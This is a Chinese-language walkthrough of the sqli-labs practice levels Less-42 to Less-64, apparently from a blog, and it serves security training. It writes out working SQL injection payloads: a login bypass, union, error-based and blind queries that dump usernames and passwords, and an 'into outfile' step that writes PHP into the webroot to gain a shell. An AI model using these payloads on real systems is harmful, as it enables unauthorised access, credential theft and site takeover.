<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># username 被过滤 ' " \ password 没有被</span></span><br><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">$password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆叠查询</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">mysqli_multi_query($con1, $sql))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 登录成功:</span><br><span class="line">    setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);</span><br><span class="line">    跳转到 logged-in.php</span><br></pre></td></tr></table></figure>
<ul>
<li><code>logged-in.php</code></li>
</ul>
<p>登录成功，提供修改密码的表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"mylogin"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"pass_change.php"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>pass_change.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 没有登录:</span><br><span class="line">    重定向到 index.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 提交了修改密码表单:</span><br><span class="line">    $username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">    $curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);</span><br><span class="line">    $pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> $pass==$re_pass:</span><br><span class="line">        $sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure>
<p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p>
<p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-42/login.php</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
<p>因为登录成功后返回：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $row[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<p>所以登录了 id 为 1 的 Dumb 用户：</p>
<p><img src="http://qiniuyun.lintstar.top/15897218466276.png" alt="15897218466276"></p>
<p>尝试<strong>联合查询</strong>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-42/login.php</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
<p><strong>报错注入</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1&apos; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
<p>同理这里也可以进行盲注和堆叠查注入，国光这里不再赘述。</p>
<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>username=(&#39;$username&#39;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p>
<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、布尔盲注、延时盲注、堆叠注入</td>
<td><code>username=&#39;$username&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、布尔盲注、延时盲注、堆叠注入</td>
<td><code>username=(&#39;$username&#39;)</code></td>
</tr>
</tbody>
</table>
<p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p>
<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>ORDER BY $id</code></td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p>
<h4 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h4><ul>
<li><strong>升序和降序验证</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 升序排序</span></span><br><span class="line">?sort=1 asc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 降序排序</span></span><br><span class="line">?sort=1 dasc</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>rand() 验证</strong></li>
</ul>
<p>rand(ture) 和 rand(false) 的结果是不一样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true)</span><br><span class="line">?sort=rand(false)</span><br></pre></td></tr></table></figure>
<p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
<p>此外 rand() 结果是一直都是随机的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand()</span><br><span class="line">?sort=1 and rand()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>延时验证</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=sleep(1)</span><br><span class="line">?sort=(sleep(1))</span><br><span class="line">?sort=1 and sleep(1)</span><br></pre></td></tr></table></figure>
<p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p>
<h4 id="报错注入1-2"><a href="#报错注入1-2" class="headerlink" title="报错注入1"></a>报错注入1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br></pre></td></tr></table></figure>
<h4 id="报错注入2-2"><a href="#报错注入2-2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>利用 procedure analyse 参数，也可以执行报错注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&apos;:&apos;,username,password)+FROM+users limit 0,1))),1)</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第 1 位为：s</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(left(database(),1)&gt;&apos;r&apos;)</span><br><span class="line">?sort=rand(left(database(),1)&gt;&apos;s&apos;)</span><br></pre></td></tr></table></figure>
<h4 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br></pre></td></tr></table></figure>
<h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><p><strong>将查询结果导入到文件中</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile "/var/www/html/less46.txt"</span><br></pre></td></tr></table></figure>
<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
<p>访问验证是否有信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:8888/less46.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure>
<p><strong>利用导出文件 getshell</strong>：</p>
<p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;/var/www/html/less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
<p>来查看下写入的文件内容是啥样子的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/less46.php</span><br><span class="line">1    Dumb    Dumb&lt;?php phpinfo();?&gt;2    Angelina    I-kill-you&lt;?php phpinfo();?&gt;3    Dummy    p@ssword&lt;?php phpinfo();?&gt;4    secure    crappy&lt;?php phpinfo();?&gt;5    stupid    stupidity&lt;?php phpinfo();?&gt;6    superman    genious&lt;?php phpinfo();?&gt;7    batman    mob!le&lt;?php phpinfo();?&gt;8    admin    admin&lt;?php phpinfo();?&gt;9    admin1    admin1&lt;?php phpinfo();?&gt;10    admin2    admin2&lt;?php phpinfo();?&gt;11    admin3    admin3&lt;?php phpinfo();?&gt;12    dhakkan    dumbo&lt;?php phpinfo();?&gt;14    admin4    admin4&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器访问测试看看：</p>
<p><img src="http://qiniuyun.lintstar.top/15897680165097.png" alt="15897680165097"></p>
<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p>
<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>ORDER BY $id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。</p>
<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。</p>
<h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>ORDER BY $id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话国光这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p>
<h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注、堆叠注入</td>
<td><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p>
<h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注、堆叠注入</td>
<td><code>ORDER BY $id</code></td>
</tr>
</tbody>
</table>
<p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
<h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注、堆叠注入</td>
<td><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
<h2 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>简单源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> reset:</span><br><span class="line">    <span class="comment"># 根据时间戳生成 cookie</span></span><br><span class="line">    setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> cookie 中有 challenge:</span><br><span class="line">        $sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 生成 cookie</span></span><br><span class="line">        $expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">        $hash = data($table,$col);</span><br><span class="line">        setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line">    <span class="keyword">if</span> $_GET[<span class="string">'id'</span>]:</span><br><span class="line">        计数器 + <span class="number">1</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">    <span class="keyword">if</span> 有查询成功:</span><br><span class="line">        输出查询信息</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        啥都不输出</span><br><span class="line"></span><br><span class="line"><span class="comment"># key 被双重过滤了</span></span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br></pre></td></tr></table></figure>
<p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p>
<p><strong>判断闭合方式</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;--+</span><br></pre></td></tr></table></figure>
<p><strong>判断字段数</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 3--+</span><br><span class="line">?id=1&apos; order by 4--+</span><br></pre></td></tr></table></figure>
<p><strong>查询有可注入的字段</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p>字段数 2,3</p>
<p>查询表名**</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()) --+</span><br></pre></td></tr></table></figure>
<p>表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样</p>
<p><strong>查询列名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4b4d413045325a323956)--+</span><br></pre></td></tr></table></figure>
<p>查到列名如下：id、sessid、secret_1XVB、tryy</p>
<p><strong>查询字段值</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+</span><br></pre></td></tr></table></figure>
<p>拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F</p>
<p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p>
<h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=($id)</code></td>
</tr>
</tbody>
</table>
<p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，国光这里不再赘述。</p>
<h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = ($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure>
<p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure>
<p>这里国光注入的表名为：WOO6ID239T，列名为：secret_OD68</p>
<h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table>
<p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p>
<h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody>
</table>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>id=((&#39;$id&#39;))</code></td>
</tr>
</tbody>
</table>
<p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p>
<h3 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody>
</table>
<p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，这是一个大工程，在实战工程中还是靠 sqlmap 这种自动化注入神器了，手工注入的话岂不是得天荒地老。</p>
<h3 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>
<h3 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=(($id))</code></td>
</tr>
</tbody>
</table>
